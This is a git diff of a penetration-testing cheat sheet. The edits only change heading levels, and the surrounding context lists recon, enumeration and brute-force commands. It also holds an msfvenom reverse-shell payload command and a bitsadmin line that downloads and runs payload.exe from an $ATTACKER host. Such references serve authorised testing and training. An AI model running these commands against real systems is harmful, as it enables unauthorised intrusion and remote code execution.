@@ -6,12 +6,12 @@ The below is heavily inspired and based on https://github.com/dostoevskylabs/dos
 
 ## Reconnaissance / Enumeration
 
-### Extracting Live IPs from Nmap Scan
+#### Extracting Live IPs from Nmap Scan
 ```bash
 nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips
 ```
 
-### DNS lookups, Zone Transfers & Brute-Force
+#### DNS lookups, Zone Transfers & Brute-Force
 ```bash
 whois domain.com
 dig {a|txt|ns|mx} domain.com
@@ -25,27 +25,27 @@ nslookup -> set type=any -> ls -d domain.com
 for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
 ```
 
-### Banner Grabbing
+#### Banner Grabbing
 ```bash
 nc -v $TARGET 80
 telnet $TARGET 80
 curl -vX $TARGET
 ```
 
-### Kerberos User Enumeration
+#### Kerberos User Enumeration
 ```bash
 nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
 ```
 
 
-### HTTP Brute-Force & Vulnerability Scanning
+#### HTTP Brute-Force & Vulnerability Scanning
 ```bash
 target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee /root/tools/$target/$target-gobuster
 target=10.0.0.1; nikto -h http://$target:80 | tee $target/$target-nikto
 target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target/$target-wpscan-enum
 ```
 
-### RPC / NetBios / SMB
+#### RPC / NetBios / SMB
 ```bash
 rpcinfo -p $TARGET
 nbtscan $TARGET
@@ -59,7 +59,7 @@ smbclient -L //$TARGET
 enum4linux $TARGET
 ```
 
-### SNMP
+#### SNMP
 ```bash
 
 # Windows User Accounts
@@ -89,25 +89,25 @@ onesixtyone -i snmp-ips.txt -c community.txt
 snmp-check $TARGET
 ```
 
-### SMTP
+#### SMTP
 ```bash
 smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
 ```
 
 ## Gaining Access
 
-### Generating Payload Pattern & Calculating Offset
+#### Generating Payload Pattern & Calculating Offset
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
 ```
 
-### Generating Payload with msfvenom
+#### Generating Payload with msfvenom
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 ```
 
-### Cross-Compiling for Windows from Linux
+#### Cross-Compiling for Windows from Linux
 ```bash
 i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 ```
@@ -116,7 +116,7 @@ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 
 ## Local Enumeration & Privilege Escalation
 
-### Binary Exploitation with ImmunityDebugger
+#### Binary Exploitation with ImmunityDebugger
 
 ##### Get Loaded Modules
 ```
@@ -130,7 +130,7 @@ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 ```
 
 
-### Setting up Simple HTTP server
+#### Setting up Simple HTTP server
 
 ```bash
 # Linux
@@ -141,7 +141,7 @@ php -S 0.0.0.0:80
 ```
 
 
-### Uploading Files to Target Machine
+#### Uploading Files to Target Machine
 
 ##### TFTP
 ```bash
@@ -200,7 +200,7 @@ wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
 cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
 ```
 
-### Bash Ping Sweeper
+#### Bash Ping Sweeper
 ```bash
 #!/bin/bash
 for lastOctet in {1..254}; do 
@@ -208,14 +208,14 @@ for lastOctet in {1..254}; do
 done
 ```
 
-### Brute-forcing XOR'ed string with 1 byte key in Python
+#### Brute-forcing XOR'ed string with 1 byte key in Python
 ```python
 encrypted = "encrypted-string-here"
 for i in range(0,255):
     print("".join([chr(ord(e) ^ i) for e in encrypted]))
 ```
 
-### Generating Bad Character Strings
+#### Generating Bad Character Strings
 
 ```python
 # Python
@@ -228,13 +228,13 @@ for i in {1..255}; do printf "\\\x%02x" $i; done
 ```
 
 
-### Port Scanning with NetCat
+#### Port Scanning with NetCat
 ```bash
 nc -nvv -w 1 -z host 1000-2000
 nc -nv -u -z -w 1 host 160-162
 ```
 
-### General File Search
+#### General File Search
 ```bash
 # query the local db for a quick file find. Run updatedb before executing locate.
 locate passwd 
